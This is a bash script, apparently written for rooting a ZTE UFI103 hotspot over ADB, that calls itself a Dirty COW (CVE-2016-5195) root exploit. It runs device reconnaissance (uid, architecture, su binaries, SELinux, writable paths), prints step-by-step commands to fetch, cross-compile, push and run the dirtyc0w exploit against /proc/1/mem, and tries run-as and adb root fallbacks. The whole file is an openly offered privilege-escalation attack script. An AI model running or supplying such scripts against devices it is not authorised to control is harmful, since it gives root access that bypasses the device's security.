#!/bin/bash
# Dirty COW root escalation for ZTE UFI103 via ADB
# CVE-2016-5195 affects Linux kernel 2.6.22 - 4.8.3
# Device kernel: 3.10.28 (VULNERABLE)
#
# This exploits the kernel directly via ADB shell without needing 'adb root'
# Works even on user builds (not just userdebug)

ADB="sudo adb"

echo "=== Dirty COW Root Exploit for ZTE UFI103 ==="
echo "Kernel: 3.10.28 (vulnerable to CVE-2016-5195)"
echo ""

# Check ADB
if ! $ADB devices | grep -q "device$"; then
    echo "ERROR: No ADB device"
    exit 1
fi

echo "ADB shell ID (before exploit):"
$ADB shell id

# Check if already root
if $ADB shell id | grep -q "uid=0"; then
    echo "Already root!"
    exit 0
fi

# Architecture
ARCH=$($ADB shell uname -m | tr -d '\r\n')
echo "Architecture: $ARCH"

echo ""
echo "=== Checking for existing su binary ==="
for SU_PATH in /sbin/su /system/bin/su /system/xbin/su /data/local/tmp/su; do
    RESULT=$($ADB shell "ls $SU_PATH 2>/dev/null" | tr -d '\r\n')
    [ -n "$RESULT" ] && echo "Found: $RESULT"
done

echo ""
echo "=== Checking SELinux status ==="
$ADB shell getenforce 2>/dev/null

echo ""
echo "=== Checking for writable paths ==="
$ADB shell "ls -la /data/local/tmp/ 2>/dev/null | head -5"

echo ""
echo "=== Option 1: Try CVE-2016-5195 (dirtyc0w) ==="
echo "Need to compile for ARM. Download from:"
echo "  https://github.com/dirtycow/dirtycow.github.io"
echo ""
echo "Compile on host (requires arm-linux-gnueabi-gcc):"
echo "  arm-linux-gnueabi-gcc -static -o dirtyc0w dirtyc0w.c -lpthread"
echo "  sudo adb push dirtyc0w /data/local/tmp/"
echo "  sudo adb shell 'chmod 755 /data/local/tmp/dirtyc0w'"
echo "  sudo adb shell '/data/local/tmp/dirtyc0w /proc/1/mem exploit_code 0'"
echo ""
echo "=== Option 2: Try 'run-as' trick (works on some Android 4.4) ==="
$ADB shell "run-as com.android.settings id 2>/dev/null" || echo "  run-as failed (no debug packages)"

echo ""
echo "=== Option 3: Try /proc/net/pppol2tp race exploit ==="
echo "  (Alternative for Android 4.4 KitKat)"

echo ""
echo "=== Option 4: Check if adb root works (userdebug build) ==="
echo "Running: adb root..."
$ADB root 2>&1
sleep 2
echo "Current uid:"
$ADB shell id
